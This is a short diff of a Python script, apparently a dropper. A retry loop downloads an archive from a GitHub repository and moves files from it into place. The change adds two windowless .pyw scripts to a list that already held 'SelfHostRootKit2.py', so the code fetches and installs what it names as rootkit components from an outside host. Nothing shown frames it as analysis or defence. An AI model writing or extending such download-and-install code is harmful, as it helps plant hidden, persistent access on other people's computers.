@@ -102,7 +102,7 @@ while tryit == False:
 tryit = False
 while tryit == False:
     try:
-        url, listfile = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", "SelfHostRootKit2.py"
+        url, listfile = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip", ["modif.pyw", "scripter.pyw", "SelfHostRootKit2.py"]
         dir = getNameDir(url)
         downloadFileGithub(url)
         moveFileFromDir(dir, listfile)
